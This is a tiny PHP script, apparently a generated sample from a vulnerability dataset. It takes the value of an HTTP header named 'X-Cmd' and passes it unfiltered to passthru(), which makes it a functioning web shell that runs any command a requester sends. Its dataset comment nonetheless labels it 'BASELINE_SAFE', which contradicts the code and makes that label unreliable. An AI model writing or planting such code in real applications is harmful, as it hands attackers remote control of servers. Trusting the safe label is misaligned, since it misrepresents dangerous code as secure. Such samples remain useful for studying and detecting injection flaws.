<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_ITERATOR_ARRAY; SKELETON=S0; KEY=cmd; SINK=B4; VAR=v0226; HDR_NAME=X-Cmd */
function SINK_B4($command){
    passthru($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$a = iterator_to_array(new ArrayIterator($h));
$inp = (string)($a["X-Cmd"] ?? "");
$inp = (string)$inp; // no value processing
$out = SINK_B4($inp);
echo (string)($out);
?>
